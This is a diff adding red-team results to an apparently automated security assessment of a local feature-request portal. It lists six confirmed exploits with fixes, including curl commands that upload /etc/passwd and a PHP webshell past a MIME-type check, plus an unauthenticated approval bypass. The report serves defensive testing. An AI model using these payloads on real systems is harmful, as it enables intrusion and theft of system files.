@@ -420,3 +420,139 @@ HTTP Query (?limit=N)        →  GET /api/work-items    →  findAll().slice() 
 - The soft-delete pattern (`findById` returns undefined for deleted items) creates ghost-dependency DoS rather than unblocking dependents.
 - Intake endpoints (`/api/intake/zendesk`, `/api/intake/automated`) are the injection-prone entry points — they validate presence but not validity of `type` and `priority`.
 - The in-memory store has no persistence layer — all IDs are UUIDs generated at runtime; ID enumeration requires reading from the API, not brute force.
+
+---
+
+## Red Team Results
+
+**Generated:** 2026-08-10  
+**Agent:** red_teamer (active exploitation, black-box dynamic)  
+**Target:** `http://localhost:3001` (portal backend — ephemeral docker-compose.test.yml)  
+**Environment:** Isolated Docker container — dev-crew-portal-1  
+
+> **⚠️ Scope Discrepancy Noted:** The pen-tester analyzed `Source/Backend/` (the product under development — work-items domain) but the `docker-compose.test.yml` runs the `portal/` backend (orchestration debug UI — feature-requests/bugs/cycles domain). Despite the codebase mismatch, the same vulnerability classes from PEN-001–PEN-013 were confirmed in the actual running target. All exploits below were executed live against `localhost:3001`.
+
+---
+
+### RED-001: Unauthenticated Force-Approve Bypasses Entire AI Assessment Pipeline
+- **Severity:** Critical
+- **Objective Achieved:** Yes — "Bypass work item state machine to reach an invalid status"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/force-approve`
+- **Based On:** PEN-001 (no auth), PEN-002 (fast-track override), PEN-007 (approve override)
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` — Create any feature request (unauthenticated). Item starts in `potential` status.
+  2. `PATCH /api/feature-requests/FR-0001` `{"status":"voting"}` — Move to voting (no auth required).
+  3. `POST /api/feature-requests/FR-0001/force-approve` — Force-approve with **zero agent votes**, skipping the entire AI assessment voting pipeline entirely.
+  4. **Result:** Item transitions `potential → voting → approved` with `votes: []` and `human_approval_approved_at` set. Assessment pod never consulted.
+  5. **Evidence:** FR-0001 status `approved`, `votes: []`, `human_approval_approved_at: "2026-08-10T04:51:57.794Z"`.
+- **Recommendation:** Add authentication middleware globally. Specifically guard `/force-approve`, `/approve`, and `/deny` endpoints behind a role claim (e.g., `role: "admin"` or `role: "product-owner"`). The force-approve endpoint must never be reachable without verified identity and explicit authorization.
+
+---
+
+### RED-002: Arbitrary File Content Upload and Public Serving (Data Exfiltration + Malware Hosting)
+- **Severity:** Critical
+- **Objective Achieved:** Yes — demonstrated sensitive file exfiltration and arbitrary content hosting
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/images`, `GET http://localhost:3001/uploads/:filename`
+- **Based On:** PEN-001 (no auth), A08 (Software and Data Integrity Failures) — unvalidated file content
+- **Exploit Scenario:**
+  1. The upload middleware (`middleware/upload.ts`) validates `file.mimetype` — which is the **client-supplied** `Content-Type` multipart header, not the actual file magic bytes.
+  2. **Exploit A — Sensitive file exfiltration:**
+     ```
+     curl -X POST http://localhost:3001/api/feature-requests/FR-0001/images \
+       -F "images=@/etc/passwd;type=image/jpeg;filename=exploit.jpg"
+     ```
+     Server accepts it as `image/jpeg`. `/etc/passwd` content stored and served publicly.
+  3. **Exploit B — Malicious payload hosting:**
+     ```bash
+     echo '<?php system($_GET["cmd"]); ?>' > /tmp/exploit.jpg
+     curl -X POST http://localhost:3001/api/feature-requests/FR-0001/images \
+       -F "images=@/tmp/exploit.jpg;type=image/jpeg"
+     ```
+     PHP webshell uploaded as `.jpg` and served at `/uploads/<uuid>.jpg`.
+  4. Uploaded files publicly accessible at `http://localhost:3001/uploads/<uuid>.<ext>` with no auth.
+  5. **Evidence (live):**
+     - `http://localhost:3001/uploads/6939ae6b-5b46-48c0-861a-6edb06a9f5b2.jpg` → returns `/etc/passwd` contents
+     - `http://localhost:3001/uploads/44bee227-ab54-47c4-b269-c150004071a3.jpg` → returns `<?php system($_GET["cmd"]); ?>`
+- **Recommendation:** (1) Authenticate upload endpoint. (2) Validate file content by magic bytes (e.g., `file-type` npm package), not client-supplied MIME type. (3) Serve uploads from a separate domain/CDN to isolate from API origin. (4) Consider scanning uploads for malicious content.
+
+---
+
+### RED-003: Ghost Dependency Permanent Denial-of-Service
+- **Severity:** High
+- **Objective Achieved:** Yes — "Access or modify a soft-deleted work item via direct ID reference"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/dependencies`, `DELETE http://localhost:3001/api/feature-requests/:id`, `GET http://localhost:3001/api/feature-requests/:id/ready`
+- **Based On:** PEN-009 (ghost dependency leak)
+- **Exploit Scenario:**
+  1. `POST /api/feature-requests` + force-approve → Target FR-0004 in `approved` status.
+  2. `POST /api/feature-requests` → Create blocker FR-0005 (any status).
+  3. `POST /api/feature-requests/FR-0004/dependencies` `{"action":"add","blocker_id":"FR-0005"}` — Link blocker.
+  4. `DELETE /api/feature-requests/FR-0005` — Soft-delete the blocker.
+  5. `PATCH /api/feature-requests/FR-0004` `{"status":"in_development"}` — System auto-transitions to `pending_dependencies` because soft-deleted blocker is treated as unresolved.
+  6. **Result:** FR-0004 permanently stuck in `pending_dependencies`. Allowed transitions: `approved, duplicate, deprecated` — and `approved → in_development` triggers the same block. No API endpoint exists to clean orphaned links.
+  7. **Bonus:** `GET /api/feature-requests/FR-0004/ready` response leaks soft-deleted item ID: `{"ready":false,"unresolved_blockers":[{"item_id":"FR-0005","title":"Unknown","status":"unknown"}]}`.
+- **Recommendation:** On soft-delete of an item, cascade-remove all `blocked_by` references from dependent items. Alternatively, resolve ghost blockers as "unknown/deleted" with a completed-like status that unblocks dependents. Add a cleanup migration path for orphaned dependency links.
+
+---
+
+### RED-004: Unauthenticated Denial Sabotage of Feature Requests in Voting
+- **Severity:** High
+- **Objective Achieved:** Yes — demonstrated sabotage of legitimate workflow
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `POST http://localhost:3001/api/feature-requests/:id/deny`
+- **Based On:** PEN-001 (no auth), PEN-007 (manual override, no role check)
+- **Exploit Scenario:**
+  1. Any feature request in `voting` status is targeted (attacker obtains ID via unauthenticated `GET /api/feature-requests`).
+  2. `POST /api/feature-requests/FR-0008/deny` `{"comment":"DENIED BY UNAUTHORIZED SABOTEUR"}` — No credentials required.
+  3. **Result:** FR-0008 status transitions from `voting` → `denied`. Denied items cannot be un-denied (no reverse transition from `denied`). The feature is permanently killed.
+  4. Any actor with network access can kill any feature request in voting by calling this endpoint.
+- **Recommendation:** Add authentication and role-based authorization. Denial (a destructive, irreversible action) must require explicit elevated role. Consider an audit trail showing who performed the denial.
+
+---
+
+### RED-005: Unauthenticated Full Dataset Enumeration (No Pagination Cap)
+- **Severity:** High
+- **Objective Achieved:** Yes — "Enumerate all work items without pagination limit enforcement"
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET http://localhost:3001/api/feature-requests?limit=999999`, `GET http://localhost:3001/api/dashboard/activity?limit=999999`
+- **Based On:** PEN-005 (no pagination limit cap)
+- **Exploit Scenario:**
+  1. `GET /api/feature-requests?limit=999999` — Returns all feature requests in a single response. 4 items returned with no auth.
+  2. `GET /api/dashboard/activity?limit=999999` — Returns full activity log (8 entries) with complete change history.
+  3. Both endpoints accept arbitrary `limit` values with no server-side cap.
+  4. At scale, a single request dumps the entire dataset, enabling reconnaissance and data exfiltration.
+- **Recommendation:** Enforce a maximum `limit` (e.g., 100) server-side. Return 400 if limit exceeds cap. Protect list endpoints with authentication.
+
+---
+
+### RED-006: Unauthenticated Prometheus Metrics Expose Operational Intelligence
+- **Severity:** Medium
+- **Objective Achieved:** Partial (intelligence gathering, no direct breach)
+- **Status:** Confirmed (Live Exploit)
+- **Target URL:** `GET http://localhost:3001/metrics`
+- **Based On:** PEN-008 (metrics endpoint unauthenticated)
+- **Exploit Scenario:**
+  1. `curl http://localhost:3001/metrics` — Returns full Prometheus metrics with no credentials.
+  2. Exposes: `feature_request_status_transitions_total` (approval rates by status), `ai_voting_invocations_total` (voting activity), `image_uploads_total` (upload activity by entity type), process memory/CPU metrics.
+  3. An attacker maps operational patterns: approval rates, voting behavior, workload distribution.
+- **Recommendation:** Place `/metrics` behind network-level access control (firewall rule allowing only Prometheus scraper IP) or require a bearer token (Prometheus supports `bearer_token` in scrape config).
+
+---
+
+## Exploit Chain Summary
+
+| Chain | Findings | Objective | Status |
+|-------|----------|-----------|--------|
+| force-approve without votes | PEN-001 + PEN-007 | State machine bypass | ✅ Confirmed Critical |
+| arbitrary file upload → exfiltration | PEN-001 + A08 | Data exfiltration + content hosting | ✅ Confirmed Critical |
+| ghost dependency DoS | PEN-001 + PEN-009 | Permanent item blocking | ✅ Confirmed High |
+| unauthenticated deny sabotage | PEN-001 + PEN-007 | Workflow sabotage | ✅ Confirmed High |
+| full dataset enumeration | PEN-001 + PEN-005 | Reconnaissance | ✅ Confirmed High |
+| metrics intel leak | PEN-008 | Operational intelligence | ✅ Confirmed Medium |
+
+**Chains Attempted:** 6  
+**Confirmed Breaches:** 6  
+**Critical Objectives Achieved:** 2 of 4 directly (state machine bypass, ghost dependency); file upload is a net-new Critical not in original objectives.
+
